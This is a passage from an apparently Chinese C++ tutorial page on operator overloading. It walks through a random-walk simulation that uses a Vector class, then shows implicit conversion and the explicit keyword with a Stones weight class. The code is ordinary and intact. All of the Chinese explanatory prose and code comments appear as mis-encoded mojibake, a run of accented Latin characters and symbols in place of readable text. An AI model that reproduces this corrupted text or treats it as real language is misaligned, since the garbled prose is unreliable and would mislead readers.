ã€å‡ã€ä¹˜ï¼‰é€šå¸¸åœ¨ç›´è§’åæ ‡ä¸‹æ‰§è¡Œæ›´ç®€å•ã€‚å³ä½¿å¯¹è±¡æ˜¯ä»¥æåæ ‡æ¨¡å¼åˆ›å»ºæˆ–è®¾ç½®çš„ï¼Œå†…éƒ¨çš„ <code>x</code> å’Œ <code>y</code> å€¼ä¹Ÿä¼šè¢«è®¡ç®—å‡ºæ¥ï¼Œè¿ç®—åŸºäºè¿™äº›å€¼è¿›è¡Œã€‚ç»“æœå¯¹è±¡é»˜è®¤ä»¥ç›´è§’åæ ‡æ¨¡å¼åˆ›å»ºï¼Œä½†å…¶ <code>mag</code> å’Œ <code>ang</code> ä¹Ÿä¼šè¢«è®¡ç®—ã€‚</li><li>  <strong>è§’åº¦å•ä½:</strong> å†…éƒ¨è®¡ç®—ï¼ˆå¦‚ <code>sin</code>, <code>cos</code>, <code>atan2</code>ï¼‰ä½¿ç”¨<strong>å¼§åº¦</strong>ã€‚æ„é€ å‡½æ•°å’Œ <code>reset</code> æ¥å—è§’åº¦å€¼ï¼ˆå¦‚æœæ˜¯æåæ ‡æ¨¡å¼ï¼‰ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºå¼§åº¦å­˜å‚¨ã€‚<code>angval()</code> å’Œ <code>operator&lt;&lt;</code> åœ¨æ˜¾ç¤ºæ—¶å°†å†…éƒ¨çš„å¼§åº¦è½¬æ¢å›<strong>è§’åº¦</strong>ã€‚</li><li>  <strong>å‹å…ƒå‡½æ•°:</strong> <code>operator*</code> (double * Vector) å’Œ <code>operator&lt;&lt;</code> è¢«å®ç°ä¸ºå‹å…ƒå‡½æ•°ï¼ŒåŸå› ä¸ <code>Time</code> ç±»ä¸­çš„ç±»ä¼¼ï¼š<code>operator*</code> éœ€è¦å¤„ç† <code>double</code> ä½œä¸ºå·¦æ“ä½œæ•°çš„æƒ…å†µï¼Œ<code>operator&lt;&lt;</code> éœ€è¦ <code>ostream</code> ä½œä¸ºå·¦æ“ä½œæ•°ï¼Œå¹¶ä¸”å®ƒä»¬éƒ½éœ€è¦è®¿é—® <code>Vector</code> çš„ç§æœ‰æˆå‘˜ã€‚</li></ul><h3 id="11-5-4-ä½¿ç”¨-Vector-ç±»æ¥æ¨¡æ‹Ÿéšæœºæ¼«æ­¥"><a href="#11-5-4-ä½¿ç”¨-Vector-ç±»æ¥æ¨¡æ‹Ÿéšæœºæ¼«æ­¥" class="headerlink" title="11.5.4 ä½¿ç”¨ Vector ç±»æ¥æ¨¡æ‹Ÿéšæœºæ¼«æ­¥"></a>11.5.4 ä½¿ç”¨ Vector ç±»æ¥æ¨¡æ‹Ÿéšæœºæ¼«æ­¥</h3><p>ç°åœ¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>Vector</code> ç±»æ¥æ¨¡æ‹Ÿä¸€ä¸ªç®€å•çš„ç‰©ç†è¿‡ç¨‹ï¼šéšæœºæ¼«æ­¥ã€‚å‡è®¾ä¸€ä¸ªäººä»åŸç‚¹å‡ºå‘ï¼Œæ¯æ¬¡éšæœºé€‰æ‹©ä¸€ä¸ªæ–¹å‘è¡Œèµ°å›ºå®šçš„ä¸€æ®µè·ç¦»ï¼Œé‡å¤å¤šæ¬¡ï¼Œæˆ‘ä»¬æƒ³çŸ¥é“ä»–æœ€ç»ˆçš„ä½ç½®ã€‚</p><p><strong>randwalk.cpp (ä¸»ç¨‹åº)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\randwalk.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;    // æä¾› rand(), srand() åŸå‹</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctime&gt;      // æä¾› time() åŸå‹</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;vector.h&quot;</span>   <span class="comment">// åŒ…å« Vector ç±»å®šä¹‰ (å‡è®¾åœ¨åŒä¸€ç›®å½•æˆ–åŒ…å«è·¯å¾„ä¸­)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line">    <span class="keyword">using</span> VECTOR::Vector; <span class="comment">// ä½¿ç”¨ VECTOR å‘½åç©ºé—´ä¸­çš„ Vector</span></span><br><span class="line"></span><br><span class="line">    srand(time(<span class="number">0</span>)); <span class="comment">// åˆå§‹åŒ–éšæœºæ•°ç”Ÿæˆå™¨</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">double</span> direction;</span><br><span class="line">    Vector step;      <span class="comment">// å½“å‰ä¸€æ­¥çš„çŸ¢é‡</span></span><br><span class="line">    <span class="function">Vector <span class="title">result</span><span class="params">(<span class="number">0.0</span>, <span class="number">0.0</span>)</span></span>; <span class="comment">// ä»åŸç‚¹å¼€å§‹çš„æ€»ä½ç§»</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> steps = <span class="number">0</span>; <span class="comment">// æ€»æ­¥æ•°</span></span><br><span class="line">    <span class="keyword">double</span> target;    <span class="comment">// ç›®æ ‡è·ç¦»</span></span><br><span class="line">    <span class="keyword">double</span> dstep;     <span class="comment">// æ¯æ­¥çš„è·ç¦»</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter target distance (q to quit): &quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; target) &#123; <span class="comment">// å¾ªç¯ç›´åˆ°è¾“å…¥éæ•°å­—</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter step length: &quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!(<span class="built_in">cin</span> &gt;&gt; dstep))</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// å¦‚æœæ­¥é•¿è¾“å…¥æ— æ•ˆåˆ™é€€å‡º</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Target Distance: &quot;</span> &lt;&lt; target &lt;&lt; <span class="string">&quot;, Step Size: &quot;</span> &lt;&lt; dstep &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; steps &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; result &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// è¾“å‡ºåˆå§‹ä½ç½®</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¼€å§‹éšæœºæ¼«æ­¥</span></span><br><span class="line">        <span class="keyword">while</span> (result.magval() &lt; target) &#123; <span class="comment">// åªè¦è¿˜æ²¡è¾¾åˆ°ç›®æ ‡è·ç¦»</span></span><br><span class="line">            direction = rand() % <span class="number">360</span>; <span class="comment">// éšæœºç”Ÿæˆ 0-359 åº¦çš„æ–¹å‘</span></span><br><span class="line">            step.reset(dstep, direction, Vector::POL); <span class="comment">// è®¾ç½®å½“å‰æ­¥çš„çŸ¢é‡ (æåæ ‡)</span></span><br><span class="line">            result = result + step; <span class="comment">// å°†å½“å‰æ­¥åŠ åˆ°æ€»ä½ç§»ä¸Š</span></span><br><span class="line">            steps++;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; steps &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; result &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// è¾“å‡ºå½“å‰ä½ç½®</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¾“å‡ºæœ€ç»ˆç»“æœ</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After &quot;</span> &lt;&lt; steps &lt;&lt; <span class="string">&quot; steps, the subject &quot;</span></span><br><span class="line">                <span class="string">&quot;has the following location:\n&quot;</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; result &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// è¾“å‡ºæœ€ç»ˆä½ç½® (é»˜è®¤ç›´è§’åæ ‡)</span></span><br><span class="line">        result.polar_mode(); <span class="comment">// åˆ‡æ¢åˆ°æåæ ‡æ¨¡å¼</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; or\n&quot;</span> &lt;&lt; result &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// è¾“å‡ºæœ€ç»ˆä½ç½® (æåæ ‡)</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Average outward distance per step = &quot;</span></span><br><span class="line">             &lt;&lt; result.magval() / steps &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// è®¡ç®—å¹³å‡æ¯æ­¥ç§»åŠ¨çš„ç›´çº¿è·ç¦»</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// é‡ç½®ä»¥ä¾¿ä¸‹ä¸€æ¬¡æ¨¡æ‹Ÿ</span></span><br><span class="line">        steps = <span class="number">0</span>;</span><br><span class="line">        result.reset(<span class="number">0.0</span>, <span class="number">0.0</span>);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nEnter target distance (q to quit): &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Bye!\n&quot;</span>;</span><br><span class="line">    <span class="built_in">cin</span>.clear(); <span class="comment">// æ¸…é™¤å¯èƒ½çš„é”™è¯¯çŠ¶æ€</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span>.get() != <span class="string">&#x27;\n&#x27;</span>) <span class="comment">// æ¸…ç©ºè¾“å…¥ç¼“å†²åŒº</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç¼–è¯‘å’Œè¿è¡Œ:</strong></p><p>ä½ éœ€è¦å°† <code>vector.cpp</code> å’Œ <code>randwalk.cpp</code> ä¸€èµ·ç¼–è¯‘é“¾æ¥ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ randwalk.cpp vector.cpp -o randwalk -lm <span class="comment"># å¯èƒ½éœ€è¦é“¾æ¥æ•°å­¦åº“ (-lm)</span></span><br><span class="line">./randwalk</span><br></pre></td></tr></table></figure><p>ç¨‹åºä¼šæç¤ºä½ è¾“å…¥ç›®æ ‡è·ç¦»å’Œæ¯æ­¥çš„é•¿åº¦ï¼Œç„¶åæ¨¡æ‹Ÿéšæœºæ¼«æ­¥è¿‡ç¨‹ï¼Œæ‰“å°æ¯ä¸€æ­¥åçš„ä½ç½®ï¼Œç›´åˆ°è¾¾åˆ°ç›®æ ‡è·ç¦»ï¼Œæœ€åè¾“å‡ºæ€»ç»“ä¿¡æ¯ã€‚è¿™ä¸ªä¾‹å­å¾ˆå¥½åœ°å±•ç¤ºäº†å¦‚ä½•åˆ©ç”¨è¿ç®—ç¬¦é‡è½½ä½¿ç±»çš„ä½¿ç”¨ï¼ˆå¦‚ <code>result = result + step;</code>ï¼‰å˜å¾—ç›´è§‚å’Œæ–¹ä¾¿ã€‚</p><h2 id="11-6-ç±»çš„è‡ªåŠ¨è½¬æ¢å’Œå¼ºåˆ¶ç±»å‹è½¬æ¢"><a href="#11-6-ç±»çš„è‡ªåŠ¨è½¬æ¢å’Œå¼ºåˆ¶ç±»å‹è½¬æ¢" class="headerlink" title="11.6 ç±»çš„è‡ªåŠ¨è½¬æ¢å’Œå¼ºåˆ¶ç±»å‹è½¬æ¢"></a>11.6 ç±»çš„è‡ªåŠ¨è½¬æ¢å’Œå¼ºåˆ¶ç±»å‹è½¬æ¢</h2><p>C++ æ˜¯ä¸€ç§å¼ºç±»å‹è¯­è¨€ï¼Œä½†å®ƒä¹Ÿå…è®¸åœ¨ä¸åŒç±»å‹ä¹‹é—´è¿›è¡Œè½¬æ¢ã€‚æˆ‘ä»¬å·²ç»ç†Ÿæ‚‰äº†å†…ç½®ç±»å‹ä¹‹é—´çš„è½¬æ¢ï¼ˆä¾‹å¦‚ <code>int</code> åˆ° <code>double</code>ï¼‰ã€‚C++ ä¹Ÿå…è®¸å®šä¹‰ç±»ç±»å‹ä¸å…¶å®ƒç±»å‹ï¼ˆåŒ…æ‹¬å†…ç½®ç±»å‹å’Œå…¶ä»–ç±»ç±»å‹ï¼‰ä¹‹é—´çš„è½¬æ¢è§„åˆ™ã€‚è¿™ç§è½¬æ¢å¯ä»¥æ˜¯è‡ªåŠ¨ï¼ˆéšå¼ï¼‰å‘ç”Ÿçš„ï¼Œä¹Ÿå¯ä»¥æ˜¯éœ€è¦æ˜¾å¼è¯·æ±‚çš„ï¼ˆå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼‰ã€‚</p><h3 id="11-6-1-éšå¼è½¬æ¢ï¼šä½¿ç”¨æ„é€ å‡½æ•°"><a href="#11-6-1-éšå¼è½¬æ¢ï¼šä½¿ç”¨æ„é€ å‡½æ•°" class="headerlink" title="11.6.1 éšå¼è½¬æ¢ï¼šä½¿ç”¨æ„é€ å‡½æ•°"></a>11.6.1 éšå¼è½¬æ¢ï¼šä½¿ç”¨æ„é€ å‡½æ•°</h3><p>å¦‚æœä¸€ä¸ªç±»çš„<strong>æ„é€ å‡½æ•°</strong>å¯ä»¥ç”¨<strong>å•ä¸ªå‚æ•°</strong>æ¥è°ƒç”¨ï¼ˆè¦ä¹ˆå®ƒåªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œè¦ä¹ˆå®ƒæœ‰å¤šä¸ªå‚æ•°ä½†ç¬¬ä¸€ä¸ªå‚æ•°ä¹‹åçš„æ‰€æœ‰å‚æ•°éƒ½æœ‰é»˜è®¤å€¼ï¼‰ï¼Œé‚£ä¹ˆè¿™ä¸ªæ„é€ å‡½æ•°å°±å®šä¹‰äº†ä¸€ä¸ªä»å…¶å‚æ•°ç±»å‹åˆ°è¯¥ç±»ç±»å‹çš„<strong>éšå¼è½¬æ¢è§„åˆ™</strong>ã€‚</p><p><strong>ç¤ºä¾‹ï¼š</strong></p><p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªç®€å•çš„ <code>Stones</code> ç±»ï¼Œè¡¨ç¤ºè‹±çŸ³ï¼ˆä¸€ç§é‡é‡å•ä½ï¼‰ï¼Œå¹¶ä¸”æˆ‘ä»¬æƒ³å…è®¸ä» <code>double</code>ï¼ˆè¡¨ç¤ºç£…ï¼‰è‡ªåŠ¨è½¬æ¢ä¸º <code>Stones</code>ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stones.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> STONES_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STONES_H_</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stones</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> Lbs_per_stn = <span class="number">14</span> &#125;; <span class="comment">// æ¯è‹±çŸ³åŒ…å«çš„ç£…æ•°</span></span><br><span class="line">    <span class="keyword">int</span> stone;      <span class="comment">// æ•´æ•°éƒ¨åˆ†çš„è‹±çŸ³</span></span><br><span class="line">    <span class="keyword">double</span> pds_left; <span class="comment">// å‰©ä½™çš„å°æ•°ç£…æ•°</span></span><br><span class="line">    <span class="keyword">double</span> pounds;   <span class="comment">// æ€»ç£…æ•°</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// æ„é€ å‡½æ•°ï¼šæ¥å—æ€»ç£…æ•° (double)</span></span><br><span class="line">    Stones(<span class="keyword">double</span> lbs);</span><br><span class="line">    <span class="comment">// é»˜è®¤æ„é€ å‡½æ•°</span></span><br><span class="line">    Stones();</span><br><span class="line">    ~Stones();</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show_lbs</span><span class="params">()</span> <span class="keyword">const</span></span>; <span class="comment">// ä»¥ç£…æ˜¾ç¤º</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show_stn</span><span class="params">()</span> <span class="keyword">const</span></span>; <span class="comment">// ä»¥è‹±çŸ³æ ¼å¼æ˜¾ç¤º</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// STONES_H_</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// stones.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stones.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">Stones::Stones(<span class="keyword">double</span> lbs) &#123;</span><br><span class="line">    pounds = lbs;</span><br><span class="line">    stone = <span class="keyword">int</span>(lbs) / Lbs_per_stn; <span class="comment">// æ•´æ•°è‹±çŸ³</span></span><br><span class="line">    pds_left = <span class="keyword">int</span>(lbs) % Lbs_per_stn + lbs - <span class="keyword">int</span>(lbs); <span class="comment">// å‰©ä½™ç£…æ•°</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Stones::Stones() &#123;</span><br><span class="line">    stone = pounds = pds_left = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Stones::~Stones() &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stones::show_lbs</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; pounds &lt;&lt; <span class="string">&quot; pounds\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stones::show_stn</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; stone &lt;&lt; <span class="string">&quot; stone, &quot;</span> &lt;&lt; pds_left &lt;&lt; <span class="string">&quot; pounds\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stones.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(<span class="keyword">const</span> Stones &amp; st, <span class="keyword">int</span> n)</span></span>; <span class="comment">// å‡½æ•°æ¥å— Stones å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Stones incognito = <span class="number">275</span>; <span class="comment">// éšå¼è½¬æ¢: è°ƒç”¨ Stones(275.0)</span></span><br><span class="line">    <span class="function">Stones <span class="title">wolfe</span><span class="params">(<span class="number">285.7</span>)</span></span>;    <span class="comment">// æ˜¾å¼è°ƒç”¨æ„é€ å‡½æ•°</span></span><br><span class="line">    Stones taft = <span class="number">325</span>;      <span class="comment">// éšå¼è½¬æ¢: è°ƒç”¨ Stones(325.0)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Incognito weighs &quot;</span>;</span><br><span class="line">    incognito.show_stn();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Wolfe weighs &quot;</span>;</span><br><span class="line">    wolfe.show_stn();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Taft weighs &quot;</span>;</span><br><span class="line">    taft.show_stn();</span><br><span class="line"></span><br><span class="line">    incognito = <span class="number">276.8</span>; <span class="comment">// éšå¼è½¬æ¢: è°ƒç”¨ Stones(276.8), ç„¶åèµ‹å€¼</span></span><br><span class="line">    taft = Stones(<span class="number">330</span>); <span class="comment">// æ˜¾å¼è½¬æ¢ (è°ƒç”¨æ„é€ å‡½æ•°)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After dinner, Incognito weighs &quot;</span>;</span><br><span class="line">    incognito.show_stn();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After dinner, Taft weighs &quot;</span>;</span><br><span class="line">    taft.show_stn();</span><br><span class="line"></span><br><span class="line">    display(<span class="number">19.99</span>, <span class="number">2</span>); <span class="comment">// éšå¼è½¬æ¢: 19.99 è½¬æ¢ä¸ºä¸´æ—¶ Stones å¯¹è±¡ä¼ é€’ç»™å‡½æ•°</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(<span class="keyword">const</span> Stones &amp; st, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Wow! &quot;</span>;</span><br><span class="line">        st.show_stn();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ <code>main</code> å‡½æ•°ä¸­ï¼š</p><ul><li>  <code>Stones incognito = 275;</code> å’Œ <code>Stones taft = 325;</code>ï¼šæ•´æ•° <code>275</code> å’Œ <code>325</code> é¦–å…ˆè¢«æå‡ä¸º <code>double</code>ï¼Œç„¶åç¼–è¯‘å™¨ä½¿ç”¨ <code>Stones(double)</code> æ„é€ å‡½æ•°åˆ›å»ºäº†ä¸€ä¸ªä¸´æ—¶çš„ <code>Stones</code> å¯¹è±¡ï¼Œå¹¶ç”¨è¿™ä¸ªä¸´æ—¶å¯¹è±¡æ¥åˆå§‹åŒ– <code>incognito</code> å’Œ <code>taft</code>ï¼ˆåœ¨ç°ä»£ C++ ä¸­ï¼Œè¿™é€šå¸¸ä¼šè¢«ä¼˜åŒ–ï¼Œç›´æ¥åœ¨ç›®æ ‡å¯¹è±¡ä¸Šæ„é€ ï¼Œç§°ä¸ºå¤åˆ¶çœç•¥ï¼‰ã€‚</li><li>  <code>incognito = 276.8;</code>ï¼š<code>double</code> å€¼ <code>276.8</code> è¢«ç”¨æ¥åˆ›å»ºä¸€ä¸ªä¸´æ—¶çš„ <code>Stones</code> å¯¹è±¡ï¼Œç„¶åè¯¥ä¸´æ—¶å¯¹è±¡é€šè¿‡èµ‹å€¼è¿ç®—ç¬¦ï¼ˆè¿™é‡Œæ˜¯é»˜è®¤çš„èµ‹å€¼è¿ç®—ç¬¦ï¼‰èµ‹ç»™ <code>incognito</code>ã€‚</li><li>  <code>display(19.99, 2);</code>ï¼š<code>double</code> å€¼ <code>19.99</code> è¢«ç”¨æ¥åˆ›å»ºä¸€ä¸ªä¸´æ—¶çš„ <code>Stones</code> å¯¹è±¡ï¼Œè¿™ä¸ªä¸´æ—¶å¯¹è±¡ä½œä¸ºå‚æ•°ä¼ é€’ç»™ <code>display</code> å‡½æ•°ã€‚</li></ul><p>è¿™ç§éšå¼è½¬æ¢æœ‰æ—¶å¾ˆæ–¹ä¾¿ï¼Œä½†ä¹Ÿå¯èƒ½å¯¼è‡´æ„æƒ³ä¸åˆ°çš„è¡Œä¸ºæˆ–é”™è¯¯ï¼Œç‰¹åˆ«æ˜¯å½“è½¬æ¢ä¸æ˜¯ç¨‹åºå‘˜çš„æœ¬æ„æ—¶ã€‚</p><p><strong>ä½¿ç”¨ <code>explicit</code> å…³é”®å­—</strong></p><p>ä¸ºäº†ç¦æ­¢æ„é€ å‡½æ•°ç”¨äºéšå¼è½¬æ¢ï¼Œå¯ä»¥åœ¨æ„é€ å‡½æ•°å£°æ˜å‰åŠ ä¸Š <code>explicit</code> å…³é”®å­—ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stones.h (ä¿®æ”¹å)</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stones</span> &#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ explicit ç¦æ­¢éšå¼è½¬æ¢</span></span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">Stones</span><span class="params">(<span class="keyword">double</span> lbs)</span></span>;</span><br><span class="line">    Stones();</span><br><span class="line">    ~Stones();</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>å¦‚æœä½¿ç”¨äº† <code>explicit</code>ï¼Œé‚£ä¹ˆä¹‹å‰çš„éšå¼è½¬æ¢ä»£ç å°†ä¸å†åˆæ³•ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 